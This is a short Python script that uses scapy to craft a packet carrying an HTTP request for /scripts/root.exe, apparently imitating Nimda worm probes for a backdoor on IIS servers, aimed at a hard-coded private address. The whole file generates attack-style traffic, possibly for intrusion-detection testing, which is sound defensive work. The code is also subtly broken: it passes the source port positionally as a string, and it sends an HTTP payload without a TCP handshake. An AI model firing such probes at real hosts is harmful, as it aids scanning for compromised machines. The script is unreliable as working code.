from scapy.all import IP, TCP, Ether, Raw, send

def send_nimda_packet(target_ip, target_port=80, source_ip="192.168.1.4",source_port="54321"):
    packet = (
        IP(src=source_ip, dst=target_ip)
        / TCP(source_port, dport=target_port)
        / Raw(load="GET /scripts/root.exe HTTP/1.0\r\nHost: example.com\r\n\r\n")
    )
    send(packet)

if __name__ == "__main__":
    target_ip = "192.168.254.104"
    send_nimda_packet(target_ip)